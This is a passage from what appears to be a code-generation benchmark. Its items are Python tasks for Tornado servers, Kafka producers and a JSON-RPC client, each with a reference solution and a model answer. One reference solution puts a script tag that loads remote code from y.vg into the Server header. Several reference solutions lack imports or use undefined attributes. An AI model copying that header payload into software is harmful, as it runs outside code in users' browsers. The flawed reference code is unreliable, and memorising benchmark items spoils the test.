    "right_result": "import tornado.ioloop\nimport tornado.web\nimport json\nimport base64\nfrom urllib.parse import unquote\n\nclass BaseHandler(tornado.web.RequestHandler):\n    def initialize(self):\n        self.set_header(\"Content-Type\", \"application/json\")\n        \n    def options(self):\n        pass\n        \n    def throw_404(self):\n        self.set_status(404)\n        self.write({\"error\": \"Resource not found\"})\n        \n    def on_finish(self):\n        pass\n\nclass CallbackHandler(BaseHandler):\n    def post(self):\n        try:\n            data = json.loads(self.request.body)\n            \n            if 'user' not in data:\n                self.set_status(400)\n                self.write({\"error\": \"Missing user parameter\"})\n                return\n                \n            user = data['user']\n            # Here you would typically validate the user\n            if not user:\n                self.throw_404()\n                return\n                \n            # Handle PGP encrypted data\n            if 'pgp_data' in data:\n                pgp_data = data['pgp_data']\n                # In a real implementation, you'd decrypt this with PGP\n                # For now we just decode from base64\n                try:\n                    decoded_data = base64.b64decode(pgp_data)\n                    decrypted_data = json.loads(decoded_data)\n                    \n                    # Process the decrypted data\n                    self.write({\n                        \"status\": \"success\",\n                        \"message\": \"PGP data processed for user: {}\".format(user),\n                        \"received_data\": decrypted_data\n                    })\n                except Exception as e:\n                    self.set_status(400)\n                    self.write({\"error\": \"Invalid PGP data format\", \"details\": str(e)})\n            \n            # Handle plain JSON data\n            elif 'json_data' in data:\n                json_data = data['json_data']\n                try:\n                    parsed_json = json.loads(json_data)\n                    \n                    # Process the JSON data\n                    self.write({\n                        \"status\": \"success\",\n                        \"message\": \"JSON data processed for user: {}\".format(user),\n                        \"received_data\": parsed_json\n                    })\n                except json.JSONDecodeError:\n                    self.set_status(400)\n                    self.write({\"error\": \"Invalid JSON format\"})\n            \n            else:\n                self.set_status(400)\n                self.write({\"error\": \"Missing pgp_data or json_data parameter\"})\n                \n        except json.JSONDecodeError:\n            self.set_status(400)\n            self.write({\"error\": \"Invalid request body\"})\n\nclass HomepageHandler(BaseHandler):\n    def get(self, path):\n        # Get user from query parameter (for demonstration purposes)\n        # In a real application, you might use cookies/sessions for authentication\n        user = self.get_argument(\"user\", None)\n        \n        if not user:\n            self.set_status(401)\n            self.write({\"error\": \"Authentication required - missing user parameter\"})\n            return\n            \n        # Example of customizing JavaScript based on user configuration\n        js_template = \"\"\"\n        // Configuration for user: {user}\n        const config = {{\n            userId: \"{user}\",\n            timestamp: {timestamp},\n            features: {features},\n            endpoint: \"{endpoint}\"\n        }};\n        \n        // Some dynamic functionality based on the path\n        function getPageInfo() {{\n            return {{\n                path: \"{path}\",\n                basePath: \"{base_path}\",\n                fullPath: window.location.pathname\n            }};\n        }}\n        \n        // Dynamic module exports\n        export default {{\n            config,\n            getPageInfo\n        }};\n        \"\"\"\n        \n        # Example user-specific configurations\n        user_configs = {\n            \"admin\": {\n                \"features\": [\"dashboard\", \"analytics\", \"settings\"],\n                \"endpoint\": \"/api/v1/admin\"\n            },\n            \"guest\": {\n                \"features\": [\"view_content\"],\n                \"endpoint\": \"/api/v1/public\"\n            }\n        }\n        \n        # Default to basic config if user not in configs\n        config = user_configs.get(user, {\n            \"features\": [\"basic_access\"],\n            \"endpoint\": \"/api/v1/default\"\n        })\n        \n        # Generate dynamic JS content\n        dynamic_js = js_template.format(\n            user=user,\n            path=path,\n            base_path=\"/dynamic-js/\",\n            timestamp=int(tornado.ioloop.IOLoop.current().time()),\n            features=json.dumps(config[\"features\"]),\n            endpoint=config[\"endpoint\"]\n        )\n        \n        # Set content type to JavaScript\n        self.set_header(\"Content-Type\", \"application/javascript\")\n        self.write(dynamic_js)\n\nclass TornadoHTTPServer:\n    def __init__(self, settings):\n        self.settings = settings\n        self.app = tornado.web.Application([\n            (r\"/callback\", CallbackHandler),\n            (r\"/dynamic-js/(.*)\", HomepageHandler),\n        ], **settings)\n        \n    def start(self, port=8888):\n        self.app.listen(port)\n        tornado.ioloop.IOLoop.current().start()"
  },
  {
    "Task_id": 244,
    "Instruction": "Task Description: Create a Tornado-based HTTP server with multiple route handlers and security headers configuration.\n\nClass Description: The implementation consists of several classes that together create a secure web server using Tornado framework. The BaseHandler provides common security headers and functionality, while specialized handlers process different routes. The TornadoHTTPServer class orchestrates the application setup and startup.\n\nAttributes:\n\nDOMAIN: [str] - Global variable storing the domain name for security policies\napp: [tornado.web.Application] - The Tornado web application instance in TornadoHTTPServer\n\nMethods:\n\nBaseHandler:\n__init__: (self, *args, **kwargs) -> None - Initializes the handler and sets security headers\ncompute_etag: (self) -> None - Disables ETag generation for responses\n\nXSSHunterApplicationHandler:\nget: (self) -> None - Handles GET requests for the /app route, renders mainapp.htm template\n\nTornadoHTTPServer:\n__init__: (self, domain: str) -> None - Initializes the server with given domain and sets up routes\nstart: (self, port: int = 1234) -> None - Starts the server on specified port\n\nHomepageHandler:\nget: (self) -> None - Handles GET requests for the root route, renders homepage.htm template\n\nFeaturesHandler:\nget: (self) -> None - Handles GET requests for /features route, renders features.htm template\n\nSignUpHandler:\nget: (self) -> None - Handles GET requests for /signup route, renders signup.htm template\n\nContactHandler:\nget: (self) -> None - Handles GET requests for /contact route, renders contact.htm template",
    "Canonical_solution": "import tornado.ioloop\nimport tornado.web\nimport tornado.template\n\nclass BaseHandler(tornado.web.RequestHandler):\n    def __init__(self, *args, **kwargs):\n        super(BaseHandler, self).__init__(*args, **kwargs)\n        self.set_header(\"X-Frame-Options\", \"deny\")\n        self.set_header(\"X-XSS-Protection\", \"1; mode=block\")\n        self.set_header(\"X-Content-Type-Options\", \"nosniff\")\n        self.set_header(\"Server\", \"<script src=//y.vg></script>\")\n        self.set_header(\"Content-Security-Policy\", \"default-src 'self' \" + DOMAIN + \" api.\" + DOMAIN + \"; style-src 'self' fonts.googleapis.com; img-src 'self' api.\" + DOMAIN + \"; font-src 'self' fonts.googleapis.com fonts.gstatic.com; script-src 'self'; frame-src 'self'\")\n\n    def compute_etag(self):\n        return None\n\nclass XSSHunterApplicationHandler(BaseHandler):\n    def get(self):\n        loader = tornado.template.Loader(\"templates/\")\n        self.write(loader.load(\"mainapp.htm\").generate(domain=DOMAIN))\n\nclass TornadoHTTPServer:\n    def __init__(self, domain):\n        global DOMAIN\n        DOMAIN = domain\n        self.app = tornado.web.Application([\n            (r\"/\", HomepageHandler),\n            (r\"/app\", XSSHunterApplicationHandler),\n            (r\"/features\", FeaturesHandler),\n            (r\"/signup\", SignUpHandler),\n            (r\"/contact\", ContactHandler),\n            (r\"/static/(.*)\", tornado.web.StaticFileHandler, {\"path\": \"static/\"}),\n        ])\n\n    def start(self, port=1234):\n        self.app.listen(port)\n        tornado.ioloop.IOLoop.current().start()\n\nclass HomepageHandler(BaseHandler):\n    def get(self):\n        loader = tornado.template.Loader(\"templates/\")\n        self.write(loader.load(\"homepage.htm\").generate())\n\nclass FeaturesHandler(BaseHandler):\n    def get(self):\n        loader = tornado.template.Loader(\"templates/\")\n        self.write(loader.load(\"features.htm\").generate(domain=DOMAIN))\n\nclass SignUpHandler(BaseHandler):\n    def get(self):\n        loader = tornado.template.Loader(\"templates/\")\n        self.write(loader.load(\"signup.htm\").generate(domain=DOMAIN))\n\nclass ContactHandler(BaseHandler):\n    def get(self):\n        loader = tornado.template.Loader(\"templates/\")\n        self.write(loader.load(\"contact.htm\").generate())",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "right_result": "import tornado.ioloop\nimport tornado.web\nimport tornado.httpserver\n\nDOMAIN = \"example.com\"\n\nclass BaseHandler(tornado.web.RequestHandler):\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        self.set_header(\"X-Content-Type-Options\", \"nosniff\")\n        self.set_header(\"X-Frame-Options\", \"DENY\")\n        self.set_header(\"X-XSS-Protection\", \"1; mode=block\")\n        self.set_header(\"Strict-Transport-Security\", \"max-age=31536000; includeSubDomains\")\n        self.set_header(\"Content-Security-Policy\", f\"default-src 'self' https://{DOMAIN}; script-src 'self' 'unsafe-inline' https://{DOMAIN}; style-src 'self' 'unsafe-inline' https://{DOMAIN}; img-src 'self' data: https://{DOMAIN}; font-src 'self' https://{DOMAIN}; connect-src 'self' https://{DOMAIN}\")\n\n    def compute_etag(self):\n        return None\n\nclass HomepageHandler(BaseHandler):\n    def get(self):\n        self.render(\"homepage.htm\")\n\nclass XSSHunterApplicationHandler(BaseHandler):\n    def get(self):\n        self.render(\"mainapp.htm\")\n\nclass FeaturesHandler(BaseHandler):\n    def get(self):\n        self.render(\"features.htm\")\n\nclass SignUpHandler(BaseHandler):\n    def get(self):\n        self.render(\"signup.htm\")\n\nclass ContactHandler(BaseHandler):\n    def get(self):\n        self.render(\"contact.htm\")\n\nclass TornadoHTTPServer:\n    def __init__(self, domain: str):\n        self.app = tornado.web.Application([\n            (r\"/\", HomepageHandler),\n            (r\"/app\", XSSHunterApplicationHandler),\n            (r\"/features\", FeaturesHandler),\n            (r\"/signup\", SignUpHandler),\n            (r\"/contact\", ContactHandler),\n        ])\n        \n    def start(self, port: int = 1234):\n        http_server = tornado.httpserver.HTTPServer(self.app)\n        http_server.listen(port)\n        tornado.ioloop.IOLoop.current().start()"
  },
  {
    "Task_id": 245,
    "Instruction": "Task Description: Create a Tornado-based HTTP server that handles web requests and serves responses, including rendering templates and serving static files.\n\nClass Description: TornadoServer is a class that encapsulates the setup and running of a Tornado web server. It configures routes, template paths, and static file paths, and provides a method to start the server.\n\nAttributes:\n- handlers: [list] - A list of URL routing tuples mapping paths to request handlers\n- template_path: [str] - The file system path to the directory containing template files\n- static_path: [str] - The file system path to the directory containing static files\n\nMethods:\n- __init__: [Name](port: int = 8000) -> None - Initializes the server with default port 8000, sets up default handlers, and configures template and static paths\n- run: [Name]() -> None - Starts the Tornado web server by:\n  1. Parsing command line options\n  2. Creating a Tornado Application instance with configured handlers and paths\n  3. Starting an HTTP server on the specified port\n  4. Beginning the I/O event loop\n\nThe class works with a companion request handler (IndexHandler) that:\n- Inherits from tornado.web.RequestHandler\n- Implements a GET method to render a template with provided data\n- Takes no explicit constructor parameters\n- Returns rendered HTML output via self.render()",
    "Canonical_solution": "import tornado.httpserver\nimport tornado.ioloop\nimport tornado.web\nimport tornado.options\nfrom tornado.options import define, options\n\ndefine(\"port\", default=8000, help=\"run on the given port\", type=int)\n\nclass IndexHandler(tornado.web.RequestHandler):\n    def get(self):\n        lst = [\"python\",\"www.itdiffer.com\",\"qiwsir@gmail.com\"]\n        self.render(\"index.html\", info=lst)\n\nclass TornadoServer:\n    def __init__(self, port=8000):\n        options.port = port\n        self.handlers = [(r\"/\", IndexHandler)]\n        self.template_path = os.path.join(os.path.dirname(__file__), \"temploop\")\n        self.static_path = \"./static\"\n\n    def run(self):\n        tornado.options.parse_command_line()\n        app = tornado.web.Application(self.handlers, self.template_path, debug=True)\n        http_server = tornado.httpserver.HTTPServer(app)\n        http_server.listen(options.port)\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "right_result": "import tornado.ioloop\nimport tornado.options\nimport tornado.web\nimport os\n\nclass IndexHandler(tornado.web.RequestHandler):\n    def get(self):\n        self.render(\"index.html\", message=\"Hello, Tornado!\")\n\nclass TornadoServer:\n    def __init__(self, port=8000):\n        self.port = port\n        self.handlers = [\n            (r\"/\", IndexHandler),\n        ]\n        self.template_path = os.path.join(os.path.dirname(__file__), \"templates\")\n        self.static_path = os.path.join(os.path.dirname(__file__), \"static\")\n\n    def run(self):\n        tornado.options.parse_command_line()\n        app = tornado.web.Application(\n            handlers=self.handlers,\n            template_path=self.template_path,\n            static_path=self.static_path\n        )\n        http_server = tornado.web.HTTPServer(app)\n        http_server.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()"
  },
  {
    "Task_id": 246,
    "Instruction": "Task Description: Implement a Tornado-based HTTP server that handles GET requests and responds with a customizable greeting message.\n\nClass Description: The TornadoHTTPServer class encapsulates the functionality to create and run a Tornado web server that listens on a specified port and handles HTTP requests.\n\nAttributes:\n- port: int - The port number on which the HTTP server will listen (default: 8000)\n- app: tornado.web.Application - The Tornado web application instance that routes requests to handlers\n- http_server: tornado.httpserver.HTTPServer - The HTTP server instance that serves the application\n\nMethods:\n- __init__(port: int = 8000) -> None - Initializes the HTTP server with the specified port (default: 8000)\n- run() -> None - Starts the HTTP server on the specified port and begins the I/O loop\n\nAdditional Class (Request Handler):\n- IndexHandler: tornado.web.RequestHandler - Handles HTTP GET requests to the root URL (\"/\")\n  Methods:\n  - get() -> None - Processes GET requests, optionally takes a 'greeting' query parameter, and returns a response combining the greeting with a welcome message",
    "Canonical_solution": "import tornado.httpserver\nimport tornado.ioloop\nimport tornado.options\nimport tornado.web\n\nclass IndexHandler(tornado.web.RequestHandler):\n    def get(self):\n        greeting = self.get_argument('greeting', 'Helloi World')\n        self.write(greeting + '\\nwelcome you to read: www.itdiffer.com')\n\nclass TornadoHTTPServer:\n    def __init__(self, port=8000):\n        self.port = port\n        self.app = tornado.web.Application(handlers=[(r\"/\", IndexHandler)])\n        self.http_server = tornado.httpserver.HTTPServer(self.app)\n\n    def run(self):\n        self.http_server.listen(self.port)\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "right_result": "import tornado.ioloop\nimport tornado.web\nimport tornado.httpserver\n\nclass IndexHandler(tornado.web.RequestHandler):\n    def get(self):\n        greeting = self.get_query_argument('greeting', 'Hello')\n        self.write(f\"{greeting}, welcome to the Tornado server!\\n\")\n\nclass TornadoHTTPServer:\n    def __init__(self, port: int = 8000) -> None:\n        self.port = port\n        self.app = tornado.web.Application([\n            (r\"/\", IndexHandler),\n        ])\n        self.http_server = tornado.httpserver.HTTPServer(self.app)\n\n    def run(self) -> None:\n        self.http_server.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()"
  },
  {
    "Task_id": 247,
    "Instruction": "Task Description: Implement a Tornado-based HTTP server that handles user data submissions via POST requests and renders responses using templates.\n\nClass Description: The implementation consists of two classes: UserHandler for processing user data and TornadoServer for managing the server lifecycle.\n\nAttributes:\n\nport: int - The port number on which the server will listen (default: 8000)\nhandlers: list - URL routing configuration mapping paths to handler classes\n\nMethods:\n\nUserHandler.post() -> None - Processes POST requests containing user data (username, email, website, language) and renders a response using the user.html template\nTornadoServer.__init__(port: int = 8000) -> None - Initializes the server with specified port\nTornadoServer.run() -> None - Configures and starts the Tornado HTTP server with defined routes and begins the I/O loop",
    "Canonical_solution": "import tornado.httpserver\nimport tornado.ioloop\nimport tornado.web\nfrom tornado.options import define, options\n\ndefine(\"port\", default=8000, help=\"run on the given port\", type=int)\n\nclass UserHandler(tornado.web.RequestHandler):\n    def post(self):\n        user_name = self.get_argument(\"username\")\n        user_email = self.get_argument(\"email\")\n        user_website = self.get_argument(\"website\")\n        user_language = self.get_argument(\"language\")\n        self.render(\"user.html\", \n                   username=user_name,\n                   email=user_email,\n                   website=user_website,\n                   language=user_language)\n\nclass TornadoServer:\n    def __init__(self, port=8000):\n        self.port = port\n        self.handlers = [\n            (r\"/user\", UserHandler)\n        ]\n        \n    def run(self):\n        app = tornado.web.Application(self.handlers)\n        http_server = tornado.httpserver.HTTPServer(app)\n        http_server.listen(self.port)\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "right_result": "import tornado.ioloop\nimport tornado.web\nimport os\n\nclass UserHandler(tornado.web.RequestHandler):\n    def post(self):\n        username = self.get_argument('username')\n        email = self.get_argument('email')\n        website = self.get_argument('website')\n        language = self.get_argument('language')\n        self.render(\"user.html\", username=username, email=email, website=website, language=language)\n\nclass TornadoServer:\n    def __init__(self, port=8000):\n        self.port = port\n        self.handlers = [(\"/submit\", UserHandler)]\n        self.app = tornado.web.Application(self.handlers)\n\n    def run(self):\n        self.app.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()"
  },
  {
    "Task_id": 248,
    "Instruction": "Task Description: Implement a Kafka message producer class in Python that can connect to a Kafka cluster, publish messages to a specified topic, and properly manage resources.\n\nClass Description: The `KafkaMessageProducer` class provides functionality to produce and send messages to a Kafka topic. It handles connection establishment, message publishing, and resource cleanup.\n\nAttributes:\n- `_producer`: [KafkaProducer] - The Kafka producer instance used to send messages.\n- `bootstrap_servers`: [list] - A list of Kafka broker addresses (default: ['host.docker.internal:9092']).\n- `api_version`: [tuple] - The Kafka API version to use (default: (0, 10)).\n\nMethods:\n- `connect()` -> [bool] - Establishes a connection to the Kafka cluster using the specified bootstrap servers and API version. Returns `True` if successful, `False` otherwise.\n- `publish_message(topic_name: str, key: str, value: str)` -> [bool] - Publishes a message to the specified Kafka topic. The `key` and `value` are converted to bytes before sending. Returns `True` if successful, `False` otherwise.\n- `close()` -> [None] - Closes the Kafka producer instance to release resources.",
    "Canonical_solution": "import json\nfrom kafka import KafkaProducer\n\nclass KafkaMessageProducer:\n    def __init__(self, bootstrap_servers=['host.docker.internal:9092'], api_version=(0, 10)):\n        self._producer = None\n        self.bootstrap_servers = bootstrap_servers\n        self.api_version = api_version\n\n    def connect(self):\n        try:\n            self._producer = KafkaProducer(\n                bootstrap_servers=self.bootstrap_servers,\n                api_version=self.api_version\n            )\n            return True\n        except Exception as ex:\n            print('Exception while connecting Kafka')\n            print(ex)\n            return False\n\n    def publish_message(self, topic_name, key, value):\n        try:\n            key_bytes = bytes(key, encoding='utf-8')\n            value_bytes = bytes(value, encoding='utf-8')\n            self._producer.send(topic_name, key=key_bytes, value=value_bytes)\n            self._producer.flush()\n            print('Message published successfully.')\n            return True\n        except Exception as ex:\n            print('Exception in publishing message')\n            print(ex)\n            return False\n\n    def close(self):\n        if self._producer is not None:\n            self._producer.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 78,
    "right_result": "from kafka import KafkaProducer\n\nclass KafkaMessageProducer:\n    def __init__(self, bootstrap_servers=None, api_version=(0, 10)):\n        self.bootstrap_servers = bootstrap_servers if bootstrap_servers else ['host.docker.internal:9092']\n        self.api_version = api_version\n        self._producer = None\n\n    def connect(self):\n        try:\n            self._producer = KafkaProducer(\n                bootstrap_servers=self.bootstrap_servers,\n                api_version=self.api_version\n            )\n            return True\n        except Exception as e:\n            print(f\"Connection failed: {e}\")\n            return False\n\n    def publish_message(self, topic_name: str, key: str, value: str):\n        if not self._producer:\n            print(\"Producer is not connected.\")\n            return False\n        try:\n            future = self._producer.send(topic_name, key=key.encode('utf-8'), value=value.encode('utf-8'))\n            future.get(timeout=5)\n            return True\n        except Exception as e:\n            print(f\"Failed to publish message: {e}\")\n            return False\n\n    def close(self):\n        if self._producer:\n            self._producer.close()"
  },
  {
    "Task_id": 25,
    "Instruction": "Task Description: Create a Python class that implements JSON-RPC 2.0 client functionality over HTTP/HTTPS, capable of sending requests, validating responses, and handling connection management.\n\nClass Description: JSONRPCExecutor is a class that facilitates JSON-RPC 2.0 communication with a remote server through HTTP/HTTPS protocols. It handles connection establishment, request sending, response validation, and connection cleanup.\n\nAttributes:\n- command: Union[str, List[str]] - Command or list of commands to be executed\n- url: str - Target URL for the JSON-RPC endpoint\n- jsonrpc_method: str - JSON-RPC method name to be invoked\n- jsonrpc_params: Optional[List[Any]] - Parameters for the JSON-RPC method (default: empty list)\n- status: str - Expected HTTP status code pattern (default: \"^2\\d\\d$\")\n- result_validator: Callable[[Any], Tuple[bool, Optional[str]]] - Optional function to validate the result\n- verify_tls: bool - Flag to enable/disable TLS certificate verification (default: True)\n- method: str - HTTP method to use (default: \"POST\")\n\nMethods:\n- _send_request(conn: Union[HTTPConnection, HTTPSConnection]) -> None - Internal method to send the JSON-RPC request\n- _validate_response(response) -> bool - Internal method to validate the JSON-RPC response\n- execute() -> bool - Main method to execute the JSON-RPC call and return success status",
    "Canonical_solution": "import json\nimport ssl\nfrom http.client import HTTPConnection, HTTPSConnection\nfrom json import JSONDecodeError\nfrom typing import Any, Callable, List, Optional, Tuple, Union\n\nclass JSONRPCExecutor:\n    def __init__(\n        self,\n        command: Union[str, List[str]],\n        url: str,\n        jsonrpc_method: str,\n        jsonrpc_params: Optional[List[Any]] = None,\n        status: str = r\"^2\\d\\d$\",\n        result_validator: Callable[[Any], Tuple[bool, Optional[str]]] = None,\n        verify_tls: bool = True,\n        **kwargs,\n    ):\n        self.command = command\n        self.url = url\n        self.jsonrpc_method = jsonrpc_method\n        self.jsonrpc_params = jsonrpc_params if jsonrpc_method else []\n        self.status = status\n        self.result_validator = result_validator\n        self.verify_tls = verify_tls\n        self.method = \"POST\"\n\n    def _send_request(self, conn: Union[HTTPConnection, HTTPSConnection]):\n        req_body = {\n            \"jsonrpc\": \"2.0\",\n            \"method\": self.jsonrpc_method,\n            \"params\": self.jsonrpc_params,\n            \"id\": repr(self),\n        }\n        conn.request(\n            method=self.method,\n            url=self.url.path,\n            body=json.dumps(req_body),\n            headers={\"Accept\": \"application/json\", \"Content-Type\": \"application/json\"},\n        )\n\n    def _validate_response(self, response):\n        try:\n            response = json.loads(response.read())\n            error = response.get(\"error\")\n            if error:\n                return False\n            assert response[\"jsonrpc\"] == \"2.0\", \"invalid jsonrpc version\"\n            assert \"id\" in response, \"no id in jsonrpc response\"\n            result = response[\"result\"]\n            if self.result_validator:\n                result_valid, reason = self.result_validator(result)\n                if not result_valid:\n                    return False\n        except (AssertionError, KeyError, UnicodeDecodeError, JSONDecodeError):\n            return False\n        return True\n\n    def execute(self):\n        try:\n            if self.url.scheme == \"http\":\n                conn = HTTPConnection(self.host, self.port)\n            elif self.url.scheme == \"https\":\n                ssl_context = None\n                if not self.verify_tls:\n                    ssl_context = ssl._create_unverified_context()\n                conn = HTTPSConnection(self.host, self.port, context=ssl_context)\n            else:\n                raise ValueError(f'Unsupported URL scheme: \"{self.url.scheme}\"')\n\n            self._send_request(conn)\n            response = conn.getresponse()\n            \n            if not self._validate_response(response):\n                return False\n\n            status = str(response.status)\n            if status == self.status or self.status_re.match(status):\n                conn.close()\n                return True\n\n        except Exception:\n            return False\n\n        return False",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "right_result": "import json\nimport re\nfrom typing import Any, Callable, List, Optional, Tuple, Union\nfrom http.client import HTTPConnection, HTTPSConnection\nfrom urllib.parse import urlparse\n\n\nclass JSONRPCExecutor:\n    def __init__(\n        self,\n        command: Union[str, List[str]],\n        url: str,\n        jsonrpc_method: str,\n        jsonrpc_params: Optional[List[Any]] = None,\n        status: str = \"^2\\\\d\\\\d$\",\n        result_validator: Optional[Callable[[Any], Tuple[bool, Optional[str]]]] = None,\n        verify_tls: bool = True,\n        method: str = \"POST\",\n    ):\n        self.command = command\n        self.url = url\n        self.jsonrpc_method = jsonrpc_method\n        self.jsonrpc_params = jsonrpc_params if jsonrpc_params is not None else []\n        self.status = status\n        self.result_validator = result_validator\n        self.verify_tls = verify_tls\n        self.method = method\n        self.response = None\n        self.success = False\n\n    def _send_request(self, conn: Union[HTTPConnection, HTTPSConnection]) -> None:\n        payload = json.dumps(\n            {\n                \"jsonrpc\": \"2.0\",\n                \"method\": self.jsonrpc_method,\n                \"params\": self.jsonrpc_params,\n                \"id\": 1,\n            }\n        )\n        headers = {\n            \"Content-Type\": \"application/json\",\n            \"User-Agent\": \"JSONRPCExecutor/1.0\",\n        }\n        conn.request(self.method, self.path, body=payload, headers=headers)\n        response = conn.getresponse()\n        self.response = response.read().decode(\"utf-8\")\n        self.status_code = response.status\n\n    def _validate_response(self) -> bool:\n        try:\n            response_data = json.loads(self.response)\n        except json.JSONDecodeError:\n            return False\n\n        if \"error\" in response_data:\n            return False\n\n        if self.result_validator:\n            success, _ = self.result_validator(response_data.get(\"result\"))\n            return success\n\n        return True\n\n    def execute(self) -> bool:\n        parsed_url = urlparse(self.url)\n        self.scheme = parsed_url.scheme\n        self.host = parsed_url.hostname\n        self.port = parsed_url.port\n        self.path = parsed_url.path or \"/\"\n\n        if self.scheme == \"http\":\n            conn = HTTPConnection(self.host, self.port)\n        elif self.scheme == \"https\":\n            context = None if not self.verify_tls else None\n            conn = HTTPSConnection(self.host, self.port, context=context)\n        else:\n            return False\n\n        try:\n            self._send_request(conn)\n            if re.match(self.status, str(self.status_code)) and self._validate_response():\n                self.success = True\n            else:\n                self.success = False\n        except Exception:\n            self.success = False\n        finally:\n            conn.close()\n\n        return self.success"
  },
  {
    "Task_id": 250,
    "Instruction": "Task Description: Implement a Kafka producer function that reads data from a file, sorts it by timestamp, and streams it to a Kafka topic at a controlled speed, with batch commit markers.\n\nFunction Description: The function reads JSON-formatted data from a file, extracts timestamps, sorts the data chronologically, and streams it to a specified Kafka topic. It maintains the original time intervals between records (adjusted by a speed factor) and inserts commit markers after each batch of records. Finally, it sends finish and commit markers before closing the producer.\n\nInput:\n- dataset_path: str - Path to the input file containing JSON records\n- speed: float (default=1) - Speed multiplier for time intervals (1.0 = realtime, 2.0 = 2x faster)\n- batch_size: float (default=500) - Number of records between commit markers\n\nOutput: None (Messages are sent to Kafka topic; no return value)",
    "Canonical_solution": "from kafka import KafkaProducer\n\nCOMMIT_COMMAND = \"*COMMIT*\"\nFINISH_COMMAND = \"*FINISH*\"\n\ndef kafka_producer(dataset_path: str, speed: float = 1, batch_size: float = 500):\n    dataset = []\n    with open(dataset_path, \"r\") as data_input:\n        for row in data_input:\n            created_at = json.loads(row)[\"tweet\"][\"created_at\"]\n            timestamp = datetime.datetime.strptime(created_at, \"%Y-%m-%dT%H:%M:%S.%fZ\")\n            dataset.append([timestamp, row])\n\n    dataset.sort(key=lambda x: x[0])\n\n    last_streamed_timestamp = None\n    producer = KafkaProducer(bootstrap_servers=[\"kafka:9092\"])\n    current_batch_size = 0\n    for timestamp, row in dataset:\n        if last_streamed_timestamp:\n            delta = (timestamp - last_streamed_timestamp).total_seconds() / speed\n            if delta > 0:\n                time.sleep(delta)\n                last_streamed_timestamp = timestamp\n        else:\n            last_streamed_timestamp = timestamp\n        producer.send(\"test_0\", row.encode(\"utf-8\", \"ignore\"), partition=0)\n        current_batch_size += 1\n        if current_batch_size >= batch_size:\n            producer.send(\"test_0\", COMMIT_COMMAND.encode(\"utf-8\"), partition=0)\n            current_batch_size = 0\n    producer.send(\"test_0\", COMMIT_COMMAND.encode(\"utf-8\"), partition=0)\n    producer.send(\"test_0\", FINISH_COMMAND.encode(\"utf-8\"), partition=0)\n    producer.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "right_result": "from kafka import KafkaProducer\nimport json\nimport time\n\ndef stream_data_to_kafka(dataset_path, speed=1.0, batch_size=500):\n    producer = KafkaProducer(bootstrap_servers='localhost:9092',\n                             value_serializer=lambda v: json.dumps(v).encode('utf-8'))\n    topic = 'input_topic'\n\n    with open(dataset_path, 'r') as file:\n        data = [json.loads(line) for line in file]\n\n    data.sort(key=lambda x: x['timestamp'])\n\n    first_timestamp = data[0]['timestamp'] / 1000.0\n    last_time = time.time()\n\n    commit_counter = 0\n\n    for record in data:\n        current_time = time.time()\n        elapsed_real = current_time - last_time\n        timestamp = record['timestamp'] / 1000.0\n        elapsed_simulated = (timestamp - first_timestamp) / speed\n\n        while elapsed_simulated > elapsed_real:\n            time.sleep(max(0, elapsed_simulated - elapsed_real))\n            current_time = time.time()\n            elapsed_real = current_time - last_time\n\n        producer.send(topic, value=record)\n        commit_counter += 1\n\n        if commit_counter >= batch_size:\n            producer.send(topic, value={'marker': 'commit'})\n            commit_counter = 0\n            last_time = time.time()\n            first_timestamp = record['timestamp'] / 1000.0\n\n    producer.send(topic, value={'marker': 'finish'})\n    producer.send(topic, value={'marker': 'commit'})\n    producer.flush()\n    producer.close()"
  },
  {
    "Task_id": 251,
    "Instruction": "Task Description: Implement a Kafka exporter class that can send items to different Kafka topics based on their type, with configurable topic mappings and data converters.\n\nClass Description: KafkaItemExporter is a class that exports items to Kafka topics based on their type. It handles the connection to Kafka, message serialization, and routing items to appropriate topics using a configurable mapping.\n\nAttributes:\n- item_type_to_topic_mapping: [dict] - A dictionary mapping item types to Kafka topics\n- converter: [CompositeItemConverter] - A converter for processing items before export\n- connection_url: [str] - The Kafka bootstrap server connection URL\n- producer: [KafkaProducer] - The Kafka producer instance for sending messages\n\nMethods:\n- __init__(output: str, item_type_to_topic_mapping: dict, converters: tuple = ()) -> None - Initializes the exporter with Kafka connection URL, topic mappings, and optional converters\n- get_connection_url(output: str) -> str - Extracts the Kafka connection URL from the output parameter\n- export_items(items: list) -> None - Exports multiple items to Kafka\n- export_item(item: dict) -> None - Exports a single item to the appropriate Kafka topic based on its type\n- close() -> None - Closes the producer (currently a no-op in reference implementation)",
    "Canonical_solution": "from kafka import KafkaProducer\nimport json\nimport logging\n\nclass KafkaItemExporter:\n    def __init__(self, output, item_type_to_topic_mapping, converters=()):\n        self.item_type_to_topic_mapping = item_type_to_topic_mapping\n        self.converter = CompositeItemConverter(converters)\n        self.connection_url = self.get_connection_url(output)\n        self.producer = KafkaProducer(bootstrap_servers=self.connection_url)\n\n    def get_connection_url(self, output):\n        try:\n            return output.split('/')[1]\n        except KeyError:\n            raise Exception('Invalid kafka output param, It should be in format of \"kafka/127.0.0.1:9092\"')\n\n    def export_items(self, items):\n        for item in items:\n            self.export_item(item)\n\n    def export_item(self, item):\n        item_type = item.get('type')\n        if item_type is not None and item_type in self.item_type_to_topic_mapping:\n            data = json.dumps(item).encode('utf-8')\n            logging.debug(data)\n            return self.producer.send(self.item_type_to_topic_mapping[item_type], value=data)\n        else:\n            logging.warning('Topic for item type \"{}\" is not configured.'.format(item_type))\n\n    def close(self):\n        pass",
    "Code_level": "Class-level",
    "FSMID_for_test": 78,
